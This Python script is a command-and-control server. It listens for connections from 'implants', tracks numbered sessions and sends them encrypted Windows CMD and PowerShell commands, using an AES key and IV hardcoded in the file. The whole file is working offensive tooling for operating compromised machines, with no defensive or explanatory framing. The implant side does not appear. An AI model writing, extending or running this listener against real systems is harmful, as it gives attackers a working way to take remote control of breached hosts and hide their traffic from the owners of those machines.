#!/usr/bin/env python3
import socket
import base64
import threading
import datetime
import os
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from prompt_toolkit import PromptSession
from prompt_toolkit.patch_stdout import patch_stdout

KEY = b"\xa1\xfc\x5b\xf2\x70\xce\x33\x60\x63\x83\xc0\xa6\xe8\x4b\xbd\x54"
IV  = b"\xbc\x9d\xbd\xfa\xe8\xbf\x08\x93\xaa\xeb\xe8\x2a\x79\x65\x77\x8b"

log_dir = "stage0_logs"
os.makedirs(log_dir, exist_ok=True)

sessions = {}  # session_id: {'sock':..., 'addr':..., 'thread':..., 'status':..., 'log':...}
sessions_lock = threading.Lock()
selected_session = None

def encrypt_msg(msg):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return cipher.encrypt(pad(msg.encode(), AES.block_size))

def decrypt_msg(blob):
    try:
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        return unpad(cipher.decrypt(blob), AES.block_size).decode()
    except:
        return "[!] AES decryption failed"

def log(session_id, msg):
    with open(os.path.join(log_dir, f"{session_id}.log"), "a") as f:
        f.write(msg + "\n")

def handle_client(sock, addr, session_id, session_obj):
    with sessions_lock:
        sessions[session_id]['status'] = 'active'
    print(f"[+] Session {session_id} from {addr[0]}:{addr[1]}")
    log(session_id, f"[CONNECTED] {datetime.datetime.now()} from {addr[0]}:{addr[1]}")
    try:
        while True:
            data = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk or b"\n" in chunk:
                    data += chunk
                    break
                data += chunk
            if not data:
                break
            try:
                raw = base64.b64decode(data.strip())
                msg = decrypt_msg(raw)
            except:
                msg = "[!] Failed to decode/decrypt incoming data"
            print(f"\n[SESSION {session_id}]")
            print(msg)
            if session_obj:
                try:
                    session_obj.app.invalidate()
                except Exception:
                    pass
            log(session_id, f"[RECV] {msg}")
    except Exception as e:
        if isinstance(e, OSError) and e.errno == 9:
            # Optionally suppress or log at a lower level
            pass
        else:
            print(f"[-] Session {session_id} error: {e}")
            log(session_id, f"[ERROR] {e}")
    finally:
        with sessions_lock:
            sessions[session_id]['status'] = 'closed'
        sock.close()
        print(f"[!] Session {session_id} closed.")

def print_help():
    print('''\
Local commands:
  help                Show this help message
  sessions            List all sessions
  use <session_id>    Switch operator control to another session
  kill <session_id>   Forcibly close a session
  exit                Exit the current session (send EXIT to implant)

Remote commands:
  CMD <command>        Run a Windows command (e.g., CMD whoami)
  <command>            Run a PowerShell command (e.g., Get-Process, whoami, dir)
''')

def print_sessions():
    with sessions_lock:
        print("\nActive sessions:")
        for sid, info in sessions.items():
            if info['status'] == 'active':
                sel = "<-- selected" if selected_session == sid else ""
                print(f"  {sid}: {info['addr'][0]}:{info['addr'][1]} [{info['status']}] {sel}")
        print()

def kill_session(session_id):
    with sessions_lock:
        if session_id in sessions and sessions[session_id]['status'] == 'active':
            try:
                # Send EXIT command to the implant before closing
                sock = sessions[session_id]['sock']
                encrypted = encrypt_msg("EXIT")  # No newline
                payload = base64.b64encode(encrypted) + b"\n"
                sock.send(payload)
                print(f"[!] Sent EXIT to implant for session {session_id}.")
            except Exception as e:
                print(f"[!] Error sending EXIT to session {session_id}: {e}")
            try:
                sessions[session_id]['sock'].close()
                sessions[session_id]['status'] = 'closed'
                print(f"[!] Session {session_id} killed.")
            except Exception as e:
                print(f"[!] Error killing session {session_id}: {e}")
        else:
            print(f"[!] Session {session_id} not found or already closed.")

def operator_loop():
    print_help()
    session = PromptSession()
    global selected_session
    with patch_stdout():
        while True:
            try:
                cmd = session.prompt("\n[OPERATOR] >>> ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n[!] Operator exiting.")
                break
            if not cmd:
                continue
            if cmd.lower() == "help":
                print_help()
            elif cmd.lower() == "sessions":
                print_sessions()
            elif cmd.lower().startswith("use "):
                _, sid = cmd.split(maxsplit=1)
                with sessions_lock:
                    if sid in sessions and sessions[sid]['status'] == 'active':
                        selected_session = sid
                        print(f"[!] Switched to session {sid}")
                    else:
                        print(f"[!] Session {sid} not found or not active.")
            elif cmd.lower().startswith("kill "):
                _, sid = cmd.split(maxsplit=1)
                kill_session(sid)
                if selected_session == sid:
                    selected_session = None
            elif cmd.lower() == "exit":
                if selected_session:
                    try:
                        sock = sessions[selected_session]['sock']
                        encrypted = encrypt_msg("EXIT\n")
                        payload = base64.b64encode(encrypted) + b"\n"
                        sock.send(payload)
                        print(f"[!] Sent EXIT to implant and closing session {selected_session}.")
                    except Exception as e:
                        print(f"[!] Error sending EXIT: {e}")
                    kill_session(selected_session)
                    selected_session = None
                else:
                    print("[!] No session selected.")
            else:
                # Send command to selected session
                if not selected_session:
                    print("[!] No session selected. Use sessions and use <session_id>.")
                    continue
                sid = selected_session
                with sessions_lock:
                    if sid not in sessions or sessions[sid]['status'] != 'active':
                        print(f"[!] Session {sid} not found or not active.")
                        continue
                    sock = sessions[sid]['sock']
                try:
                    encrypted = encrypt_msg(cmd + "\n")
                    payload = base64.b64encode(encrypted) + b"\n"
                    sock.send(payload)
                    log(sid, f"[SENT] {cmd}")
                except Exception as e:
                    print(f"[!] Error sending command: {e}")

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <listen_ip> <port>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[+] Listening on {host}:{port}")

    session_count = 0

    # Create the session object first for access in accept_loop
    operator_loop.session = PromptSession()
    
    def accept_loop():
        nonlocal session_count
        global selected_session
        while True:
            client, addr = server.accept()
            session_count += 1
            session_id = str(session_count)
            with sessions_lock:
                sessions[session_id] = {
                    'sock': client,
                    'addr': addr,
                    'thread': None,
                    'status': 'pending',
                    'log': os.path.join(log_dir, f"{session_id}.log")
                }
            # Pass the session object to the handler
            t = threading.Thread(target=handle_client, args=(client, addr, session_id, operator_loop.session), daemon=True)
            with sessions_lock:
                sessions[session_id]['thread'] = t
            t.start()
            print(f"[+] New session {session_id} from {addr[0]}:{addr[1]}")
            if not selected_session:
                selected_session = session_id

    accept_thread = threading.Thread(target=accept_loop, daemon=True)
    accept_thread.start()

    try:
        with patch_stdout():
            operator_loop()
    except KeyboardInterrupt:
        print("\n[!] Server shutting down (KeyboardInterrupt)")
        server.close()
        os._exit(0)

if __name__ == "__main__":
    main()
